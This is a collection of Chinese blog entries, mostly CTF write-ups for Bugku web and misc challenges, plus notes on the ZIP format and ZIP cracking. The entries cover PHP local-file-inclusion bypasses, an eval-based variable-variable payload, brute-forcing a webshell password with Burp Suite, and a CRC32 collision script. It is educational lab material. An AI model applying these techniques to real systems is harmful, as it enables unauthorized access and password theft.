返回一串base64编码1PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== base64解码后123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data"))&#123; echo "Oh no!"; exit(); //达到过滤效果，这是php://中的其他方法 &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125; #flag在注释中?&gt;&lt;/html&gt; 123include()函数，这个表示从外部引入php文件并执行，如果执行不成功，就返回文件的源码而include的内容是由用户控制的，所以通过我们传递的file参数，是include（）函数引入了index.php的base64编码格式，ase64编码格式导致执行不成功，返回base64格式源码。如果不进行base64编码传入，就会直接执行，而flag的信息在注释中，是得不到的。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>base64</tag>
        <tag>文件包含</tag>
        <tag>php://</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-WEB4]]></title>
    <url>%2F2019%2F01%2F28%2F201925%2F</url>
    <content type="text"><![CDATA[WEB4-writeup打开题目访问链接，提示看看源代码？查看源代码得到一串经过escape编码的代码进行escape解码后123var p1 = 'function checkSubmit()&#123;var a=document.getElementById("password");if("undefined"!=typeof a)&#123;if("67d709b2b';var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1&#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;';eval(unescape(p1) + unescape('54aa2' + p2)); 主要看这一句eval(unescape(p1) + unescape(‘54aa2’ + p2))1234eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。语法eval（string）string-必需。要计算的字符串，其中含有要计算的JavaScript表达式或要执行的语句 p1+p2连接整理后的代码1234567891011function checkSubmit()&#123; var a=document.getElementById("password"); //匹配ID名为password的元素，并赋值给a if("undefined"!=typeof a)&#123; //判断a的类型是否undefined if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) //判断a的元素的value值是否为67d709b2b54aa2aa648cf6e87a7114f1（67d709b2b+54aa2+aa648cf6e87a7114f1） return!0; alert("Error"); //弹框“Error”” a.focus(); //获取焦点时，向元素添加特殊的样式（改变背景颜色） return!1 //! 表示取反运算，js 为弱类型语言，所有非0的int值都为 Bool 值的 True ，所以 !1就是取 True的反，即False。 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit; //获取id为levelQuest文档元素，点击submit时执行checkSubmit函数，onsubmit再点击submit时发生，若返回真提交表单 12345678910111213141516171819var 声明（创建）JavaScript变量escape() 函数定义和用法escape() 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。语法escape(string)string-必需。需要转义或编码的字符串unescape() 函数定义和用法unescape() 函数可对通过 escape() 编码的字符串进行解码。unescape(string)string-必需。要解码或反转义的字符串typeof操作符返回一个字符串，表示未经计算的操作数的类型详情点击：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/typeof#%E5%8F%82%E6%95%B0 分析完代码后，表单的id值为levelQuest，通过审查元素将输入框的id值更改为password，输入框输入67d709b2b54aa2aa648cf6e87a7114f1点击submit]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>escape</tag>
        <tag>unescape</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-网站被黑]]></title>
    <url>%2F2019%2F01%2F28%2F201924%2F</url>
    <content type="text"><![CDATA[网站被黑-writeup打开题目访问链接，大大黑页（好酷炫这东西可以玩一整天，2333）查看源代码，尝试了一些方法，没有找到一点思路打开御剑扫描工具，扫描一下看有没有敏感信息、源码泄露之类的得到一个链接，感觉像是一个后门地址正是一个shell后门，尝试几个常见的密码，无果直接用burp suite进行密码爆破进行抓包右键发送到intruder添加需要的变量，list选择自带的一个Passwords，点击Start attack开始这里length不一样的就是密码了因为我们通常输入正确的密码和错误的密码返回的请求长度是有区别的输入密码，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>shell后门</tag>
        <tag>弱口令爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-头等舱]]></title>
    <url>%2F2019%2F01%2F28%2F201923%2F</url>
    <content type="text"><![CDATA[头等舱-writeup打开题目点击访问链接，查看源代码发现什么都没有利用burp suite抓包看下，根据题目提示头等舱，查看Response中的Headers信息，得到flag]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Headers</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-web5]]></title>
    <url>%2F2019%2F01%2F26%2F201922%2F</url>
    <content type="text"><![CDATA[web5-writeup打开题目点击访问,出现输入框，随便输入点字符串，点击提交，提示(在好好看看)查看源代码，出现了一大串(!+()[])，根据题目提示，这应该是一串JSFuck编码1234567891011JSFuck []()!+JSFuck是一种基于JavaScript原子部分的深奥教育编程风格。它只使用六个不同的字符来编写和执行代码。它不依赖于浏览器，因此您甚至可以在Node.js上运行它。简单来说JSFuck可以让你只用6个字符[]()!+来编写JavaScript程序。用途：①脚本注入时防止过滤②一定程度加密关键代码（不适合加密大量代码，毕竟太长了）③把包含的字符做到极致（[]()!+）④转换后本质依然是JavaScript，通过JavaScript的一些特性生成。了解更多可以访问：https://github.com/aemkei/jsfuck 我们直接将JSFuck复制下来利用浏览器的Console执行，或者在线工具进行转换（http://www.jsfuck.com/）将得到的值进行提交，提示（唉吆，已经非常非常接近了。。。）将得到的值换成大写（题目提示），提交]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>JSFuck</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MORSE与ASCII码对应表]]></title>
    <url>%2F2019%2F01%2F26%2F201921%2F</url>
    <content type="text"><![CDATA[MORSE与ASCII码对应表 转换工具因为之前做到过相关的题目所以根据对应关系我写了一个ascii2morse_tool下载地址:https://github.com/alixiaowei/ascii2morse-tool12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# coding: utf-8import sysif len(sys.argv) != 3: print(''' $$$$ @$$$&amp; $$$$q h$$$$$a $$$$$$) $$$$$ *$$$$$$&gt;]$ .$$$$$@ $$$$ $$[$ $$" X$$ @$d $$) $$ $$$ :$^ .$$$ $$! M$$ $$$ $$$ @$$ $$I ,$8 a$) $ $$$ $. $$ $$ "$$ $$$ o$$ p$$ +$M @$~ a$)$' f$ $ $$ $$f $$$ o$$ p$$ $$ $$ a$$ ;$$ &#125;$$ &lt;$$ $$$ o$$ p$$ 1$$ $$&lt; a$p $$$$; $$$ `$$ $$$ o$$ p$$ 8$$ $$$ a$) @$$$$$" $$$$$$$$$$$$$$$ $$$ o$$ p$$ B$$ $$$ a$) $$$$$\ $$$ $$$ o$$ p$$ Q$$ $$( a$) +$$$ $$$ $$$ o$$ p$$ $$ $$ a$) Q $$@ k$$ $$$ o$$ p$$ #$&lt; )$M a$) $ $$ $$ h $$$ o$$ p$$ $$ $$ a$) $$ .$+ +$$ $ $$$ $$$ %$$ $$&#125; l$@ 8$q $$$` :$C $$Q p$ $$$$$ $$$$$ $$$$$ $$$$$$$ $$$$$$$$$$$l $8'Z$$$$$$&amp; Q$$$$$$p @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ''') print('-v Enter the ASCII you want to convert \n\nusage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"\n') exit(1)if sys.argv[1] != '-v': print('usage: python -v ascii2morse-tool.py "1001 00 01 111 011 0 00"', ' \n 参数错误，请重新输入...') exit(1)string = sys.argv[2]key = string.split(' ')dictionary = &#123;'01': 'A', '1000': 'B', '1010': 'C', '100': 'D', '0': 'E', '0010': 'F', '110': 'G', '0000': 'H', '00': 'I', '0111': 'J', '101': 'K', '0100': 'L', '11': 'M', '10': 'N', '111': 'O', '0110': 'P', '1101': 'Q', '010': 'R', '000': 'S', '1': 'T', '001': 'U', '0001': 'V', '011': 'W', '1001': 'X', '1011': 'Y', '1100': 'Z', '01111': '1', '00111': '2', '00011': '3', '00001': '4', '00000': '5', '10000': '6', '11000': '7', '11100': '8', '11110': '9', '11111': '0', '001100': '?', '10010': '/', '101101': '()', '100001': '-', '010101': '.', '110011': ',', '011010': '@', '111000': ':', '101010': ':', '10001': '=', '011110': "'", '101011': '!', '001101': '_', '010010': '"', '10110': '(', '1111011': '&#123;', '1111101': '&#125;'&#125;value = ''for item in key: if item == '': continue value += dictionary[item]print('\nCapital: \n', value)print('\nLower case: \n', value.lower(), '\n\nwww.axiaowei.cn')]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>ASCII</tag>
        <tag>加密</tag>
        <tag>Morse</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-easy_crypto]]></title>
    <url>%2F2019%2F01%2F26%2F201920%2F</url>
    <content type="text"><![CDATA[easy_crypto-writeup打开题目一个看似跟二进制相似的一串密文观察这一串密文，每一组都是由0和1组成，有长有短，刚开始还以为是ascii转换折腾了挺久，想了下会不会是Morse莫尔斯电码。找了下资料，找到了他们的对应关系。可参考Morse与ASCII码的对应关系找到这个剩下的就是将其对应的转换成相应的字符了可以使用我写的一个ascii2morse工具下载地址：https://github.com/alixiaowei/ascii2morse-tool]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>ASCII</tag>
        <tag>加密</tag>
        <tag>Morse</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-变量1]]></title>
    <url>%2F2019%2F01%2F25%2F201919%2F</url>
    <content type="text"><![CDATA[变量1-writeup打开题目点击访问链接得到一串php代码提示1234567891011121314&lt;?php error_reporting(0); //关闭错误报告（报错不显示）include "flag1.php"; //引用flag1.php文件代码highlight_file(__file__); //语法高亮if(isset($_GET['args']))&#123; //检查变量是否声明 $args = $_GET['args']; //赋值给变量$args if(!preg_match("/^\w+$/",$args))&#123; //!preg_match 不匹配, ^匹配字符串的开始，\w匹配字母或数字或下划线或汉字等价于'[^A-Za-z0-9_]',$匹配字符串的结束 这里达到过滤作用。 die("args error!"); //输出args error!并退出当前脚本 &#125; eval("var_dump($$args);");//eval()将字符串作为php代码执行,var_dump()函数 打印变量的相关信息,显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。$$args可变变量&#125;?&gt; 12345678910可变变量（Variable variables）可变变量是一种独特的变量，他允许动态改变一个变量的名称。其工作原理是该变量的名称由另外一个变量的值来确定，实现过程就是在变量的前面再多加一个美元符号“$”。下面举一个例子，实例代码如下：&lt;?php$args = "xiaowei"; //声明变量$args$xiaowei = "www.axiaowei.cn"; //声明变量$xiaoweiecho $args; //输出变量$argsecho "\n"; //换行echo $$args; //通过可变变量输出$xiaowei的值?&gt; 再看提示的第一句话flag in the variable! （#flag在变量中）上述的可变变量简单来说$args的值是另一个变量的变量名。那么$$args就代表另一个变量。所以我们就给args赋值一个变量名我们测试php的中的超全局变量，将其变量名传入1234567891011超全局变量 — 超全局变量是在全部作用域中始终可用的内置变量超全局变量:$GLOBALS：[一个包含了全部变量的全局组合数组]$_SERVER:[是预定义服务器变量的一种,所有$_SERVER开头的都是预定义服务变量]$_GET：[用于获取url地址栏的参数数据]$_POST： [用于接收post提交的数据]$_FILES：[用于文件就收的处理img 最常见]$_COOKIE： [用于获取与setCookie()中的name 值]$_SESSION： [用于存储session的值或获取session中的值]$_REQUEST：[具有get,post的功能，但比较慢]$_ENV：[ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它] 直接构造payload：?args=BLOBLAS]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>变量</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-本地包含]]></title>
    <url>%2F2019%2F01%2F25%2F201918%2F</url>
    <content type="text"><![CDATA[本地包含-writeup访问链接，显示123，查看源代码，没有任何提示，尝试了几个常见的本地包含的姿势，输入什么都是123,也不报错，并没有什么用试着用御剑扫描一下，出来了个flag.php（没有的可以自己往字典里加）访问flag出来了（很迷？？？）个人感觉这个环境应该是已经玩坏了-_-!]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-你必须让他停下]]></title>
    <url>%2F2019%2F01%2F24%2F201917%2F</url>
    <content type="text"><![CDATA[你必须让他停下-writeup打开题目点击访问链接，无限刷新，查看源代码发现js中，如下：12345function myrefresh()&#123; //声明一个函数window.location.reload(); //重新加载当前文档。&#125;setTimeout('myrefresh()',500); //在指定得毫秒数（500）调用函数1000毫秒 = 1秒 你也可以跟我一样，那么准，当显示10.jpg（大概有15张jpg）得页面得时候按pc上的ESC，让页面停止，按F12查看flag想其flag显示在页面上可以把标签中得style=”display:none”中去掉就可以了（并没有什么用，能得到flag就可以了）12display:none将元素的显示设为无，即在网页中不占任何的位置。 我讲一下其他几种方式吧，毕竟上面得操作有点看手速[掩面]view-source 可以利用view-source:查看源代码，然后在当前页面一直刷新（F5），直到flag出现。 抓包工具(这里我用得是burp suite)抓取到页面，发送到Repeater，一直点击go，很快就会出现得]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-域名解析]]></title>
    <url>%2F2019%2F01%2F24%2F201916%2F</url>
    <content type="text"><![CDATA[域名解析-writeup打开题目：首先打开链接，访问显示404根据题目要求把flag.baidu.com解析到123.206.87.240应该就可以拿到flagWindows平台修改C:\Windows\System32\drivers\etc下得hosts文件添加一条解析记录（如果出现修改权限不足的问题，可以利用替换）然后访问flag.baidu.com就可以看到flag了。Linux平台（如kali）直接编辑etc/hosts文件添加一条解析记录一样，直接访问flag.baidu.com就可以到flag了 12hostHosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS域名解析服务器进行IP地址的解析。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-一个普通的压缩包(xp0intCTF)]]></title>
    <url>%2F2019%2F01%2F23%2F201911%2F</url>
    <content type="text"><![CDATA[一个普通的压缩包(xp0intCTF)-writeup打开题目下载得到一个rar压缩包附件，解压打开发现还有一个flag.rar，文件属性，详细信息各种查看确定没有隐藏信息，进行再次解压出现提示png文件损坏先打开里面的文本看一下，文本内容提示flag is not here，现在把flag.rar放在十六进制工具里看下，发现里面有一张secret.png文件，但是之前提示损坏了，刚开始用winrar自带的修复功能修复不成功，只能自己用010Editor进行手动修复了。检查rar头，没有问题，然后再看加密部分，检查各个文件的文件头12文件头（FILE_HEAD）HEAD_TYPE 1 个字节 头类型：0x74 更多可以点击RAR文件格式研究我们回到我们的题目中来，检查发现png那的文件头类型A8 3C 7A，把7A修改为74，保存，查看是否修复成功。得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件1GIF文件头标识 (6 bytes) 47 49 46 38 39(37) 61—— GIF89(7)a 修改为gif用stegsolve查看得到gif的两帧每一帧有半张二维码(这里也可以用Photoshop进行分离图层)123456StegSolveAnalyse下面几个功能键作简单介绍：File Format:文件格式，这个主要是查看图片的具体信息Data Extract:数据抽取，图片中隐藏数据的抽取Frame Browser:帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看Image Combiner:拼图，图片拼接 用Photoshop将这两块进行拼接成完整的二维码，利用QR扫描（手机扫也一样的）得到flag二维码的生成细节和原理有兴趣的可以去了解下。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip文件格式说明]]></title>
    <url>%2F2019%2F01%2F22%2F201914%2F</url>
    <content type="text"><![CDATA[zip文件格式zip文件由三部分组成：压缩的文件内容源数据、压缩的目录源数据、目录结束标识的结构①压缩文件内容的源数据：记录着压缩的所有文件的内容信息，其数据组织结构是对于每个文件都由File header 、File data 、 Data descriptor 三部分组成。File header（文件头）：用于标识该文件的开始，结构说明如下：File data(文件数据)：相应压缩文件的源数据。Data descriptor（数据描述符）：用于标识该文件压缩结束，该结构只有在相应的local file header中通用标记字段的第３bit设为１时才会出现，紧接在压缩文件源数据后。这个数据描述符只用在不能对输出的 ZIP 文件进行检索时使用。例如：在一个不能检索的驱动器（如：磁带机上）上的 ZIP 文件中。如果是磁盘上的ZIP文件一般没有这个数据描述符。②Central directory 核心目录记录了压缩文件的目录信息，在这个数据区中每一条记录对应再压缩源文件数据区中的一条数据。核心目录结构：③End of central directory record(EOCD) 目录结束标识目录结束标识存于整个归档包的结尾，用于标记压缩目录数据的结束。每个压缩文件必须有且只有一个EOCD记录。 官方文档：https://pkware.cachefly.net/webdocs/APPNOTE/APPNOTE-6.2.0.txt]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>ZIP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zip压缩包--加密破解篇]]></title>
    <url>%2F2019%2F01%2F22%2F201915%2F</url>
    <content type="text"><![CDATA[伪加密、爆破、明文攻击、CRC32碰撞zip文件格式：zip文件由三部分组成：压缩的文件内容源数据、压缩的目录元数据、目录结束标识结构详情点击：zip格式说明 zip伪加密若是没有加密的zip文件，两处标记都是00 00如果是加密的zip文件，两处都标记的是09 00（注意不同的压缩软件有差异，有些好像是01 00）若将未加密的zip文件中的压缩源文件目录区的全局方式位标记改为01 00 （或者09 00），就会被压缩软件认为已加密，这就是所谓的伪加密了破解伪加密的zip，只要把压缩文件目录区的全局方式标记改为00 00 （除windows外的系统（如kali）可直接打开伪加密压缩包） 爆破爆破：逐个尝试选定集合中的可以组成的所有密码，直到遇到正确的密码。分为暴力破解、掩码破解、字典破解这几种1、暴力破解：选择密码范围，长度等，由软件组合生成密码进行破解2、掩码破解：知道密码中的一部分，只需要按照规则构造其余部分进行破解3、字典破解：通常是多数用户常用的一些密码集合，导入字典文件用字典中的密码进行破解（取决你的字典）这里可以使用Windows下的一款神器AZPR，也可以自己动手用python写个爆破的脚本。 明文攻击明文攻击（Known plaintext attack）：是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。明文攻击是一种较为高效的攻击手段，如：当你不知道一个zip压缩包文件的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有压缩文件使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。简单来说就是，zip明文攻击就是利用已知文件找到加密密钥，利用密钥来解释其他加密文件，因为zip压缩包里的所有文件都是使用同一个加密密钥来加密的。这里举个例子：现在我压缩了带密码的四个文件，已知明文攻击测试.zip中的明文攻击.docx进行对已知文件进行压缩，对比crc值是否跟加密文件中的crc值一致利用AZPR进行明文攻击成功获取到密文注意：当明文的大小比较小时，或者密文过长，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的，如果出现错误可以多试几款压缩软件。 CRC32碰撞CRC32：CRC本身是“冗余校验码”的意思，CRC32则标识会产生一个32bit（8位十六进制）的校验值。 CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。 每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能力，通常只适用于较小文本文件。 案例：可以参考我写的Bugku-好多压缩包那篇文章。bugku中的例子脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8import binasciiimport stringimport zipfileimport base64dicts = string.printable # 可打印字符的字符串。ascii码33-126号def collision_crc(crc): global out_file for a in dicts: for b in dicts: for c in dicts: for d in dicts: strings = a + b + c + d strings = strings.encode('utf-8') if crc == (binascii.crc32(strings)): out_file.write(strings.decode('utf-8')) # print(strings) return # 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件def obtain_zip(): for i in range(68): file = 'out' + str(i) + '.zip' zip_file = zipfile.ZipFile(file, 'r') # 读取创建zip_file对象 get_crc = zip_file.getinfo('data.txt') # 压缩文件夹里的data.txt文件，获取文档内指定的文件信息 crc = get_crc.CRC # 以上定义一个方法，获取68个zip的CRC的值 collision_crc(crc) # 再调用collision方法传参out_file = open('out.txt', 'w')obtain_zip()out_file.close()out_file2 = open('out.txt', 'r')with open('flag.rar', 'wb') as rar: rar.write(base64.b64decode(out_file2.read())) # 二进制将转换后的base64位写入文件]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
        <tag>加密</tag>
        <tag>爆破</tag>
        <tag>ZIP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-好多压缩包]]></title>
    <url>%2F2019%2F01%2F21%2F201906%2F</url>
    <content type="text"><![CDATA[好多压缩包-writeup打开题目得到一个压缩包附件，进行解压，查看到里面有68个压缩包打开68个文件发现里面每个压缩包里都有一个四个字节大小的txt文档（加密），首先尝试下是不是伪加密，发现不是尝试下爆破无果。。。然后想了下，这么多压缩包，不可能让我们爆破吧，尝试下crc32碰撞CRC32碰撞可以参考我写的文章zip压缩包–加密篇** 分析里面得文件得四个字节，想着应该是英文，中文字符得话跟爆破没区别…猜测里面为四个字符（英文），获取zip文件得crc32值，进行crc碰撞碰撞出来发现是一串base64，拿去解密(有些网站解码不了，解码了也是有问题的，多尝试几个)，放入winhex，发现导入进去的时候老是有问题，我不知道怎么处理，莫名其妙的多了很多空格，搜索了下感觉他们很顺利的就放进去了尝试多次发现无果。然后无奈就自己写python实现直接base64解密后直接写入文件里python脚本：12345678910111213141516171819202122232425262728293031323334353637383940414243# coding:utf-8import binasciiimport stringimport zipfileimport base64dicts = string.printable # 可打印字符的字符串。ascii码33-126号def collision_crc(crc): global out_file for a in dicts: for b in dicts: for c in dicts: for d in dicts: strings = a + b + c + d strings = strings.encode('utf-8') if crc == (binascii.crc32(strings)): out_file.write(strings.decode('utf-8')) # print(strings) return # 以上定义一个方法，组合随机字符与CRC进行碰撞，判断如果相等及写入文件def obtain_zip(): for i in range(68): file = 'out' + str(i) + '.zip' zip_file = zipfile.ZipFile(file, 'r') # 读取创建zip_file对象 get_crc = zip_file.getinfo('data.txt') # 压缩文件夹里的data.txt文件，获取文档内指定的文件信息 crc = get_crc.CRC # 以上定义一个方法，获取68个zip的CRC的值 collision_crc(crc) # 再调用collision方法传参 out_file = open('out.txt', 'w')obtain_zip()out_file.close()out_file2 = open('out.txt', 'r')with open('flag.rar', 'wb') as rar: rar.write(base64.b64decode(out_file2.read())) # 二进制将转换后的base64位写入文件 运行完成后将写出的文件，打开发现打开失败，导入16进制编辑器，观察数据，发现存在rar的文件尾C4 3D 7B 00 40 07 00，但缺少文件头，于是补上rar的文件头52 61 72 21 1A 07 00，发现文件修复成功，解压发现是一个flag在压缩包注释上。二进制上也可以看到CMT，CMT即为comment（注释） 这里说明下我之前base64导入进去的出现的问题，因为心里一直纳闷，所以去多次尝试发现需要利用notepad++32位的进行base64解密，就可以得到正确的值，保存为.rar文件，然后进行导入十六进制编辑工具里是可以实现的。（之前用的时notepad++64位的会出现解密不出来的情况，几个在线工具解密出来的值都是错误的或者跟上面导进去不知道为什么多了很多空格这些）这里举几个对比：]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Bugku-怀疑人生]]></title>
    <url>%2F2019%2F01%2F20%2F201907%2F</url>
    <content type="text"><![CDATA[怀疑人生–wirteup打开题目得到一个附件，发现是zip的文件头，直接在后缀上加上一个.zip。解压，发现三个文件。第一个需要解压密码，先看下其他文件有没有其他hint直接丢进kali，分析一波，分离ctf2.jpg得到一个压缩包解压，里面存在一个txt文本，发现一串加密得密文Brainfuck/Ook!编码，拿去Ook解密来看这个奇怪得二维码，直接那QR扫以下看下有什么信息，得到内容折腾了挺久也好像没有其他信息了，字典破解，尝试下，还真有！解压得到一串base64，进行base64解密，得到一串unicode，进行解密解密后进行拼接，提交发现失败，尝试多次，很纳闷，感觉不对劲，中间那Ook解密后感觉还是一个密文，查了一下是一个base58？？？进行解密得到明文，进行ctf1+ctf2+ctf3进行拼接，提交成功。1234567891011121314151617此题出现了几种编码：base64:Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法。base58:Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址,相比Base64，Base58不使用数字"0"，字母大写"O"，字母大写"I"，和字母小写"l"，以及"+"和"/"符号.Unicode:Unicode又称（统一码、万国码、单一码）世界上存在着多种编码方式，同一个二进制数字可以被解释成不同的符号。因此，要想打开一个文本文件，就必须知道它的编码方式，否则用错误的编码方式解读，就会出现乱码。为什么电子邮件常常出现乱码？就是因为发信人和收信人使用的编码方式不一样。可以想象，如果有一种编码，将世界上所有的符号都纳入其中。每一个符号都给予一个独一无二的编码，那么乱码问题就会消失。这就是 Unicode，就像它的名字都表示的，这是一种所有符号的编码。Brainfuck/Ook:Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。OOK！是一种为红毛猩猩设计的编程语言。OOK！与众所周知的深奥语言BrainF ***基本上是同构的 ，但语法元素更少。详情可跳转至http://www.dangermouse.net/esoteric/ook.html二维码:二维码又称二维条码，常见的二维码为QR Code，QR全称Quick Response，是一个近几年来移动设备上超流行的一种编码方式，它比传统的Bar Code条形码能存更多的信息，也能表示更多的数据类型。]]></content>
      <categories>
        <category>Bugku</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>CTF</tag>
        <tag>MISC</tag>
        <tag>Brainfuck</tag>
        <tag>Ook</tag>
        <tag>Unicode</tag>
        <tag>base64</tag>
        <tag>base58</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入攻击]]></title>
    <url>%2F2019%2F01%2F20%2F201913%2F</url>
    <content type="text"><![CDATA[待更新…..]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CBC字节翻转攻击原理]]></title>
    <url>%2F2019%2F01%2F20%2F201912%2F</url>
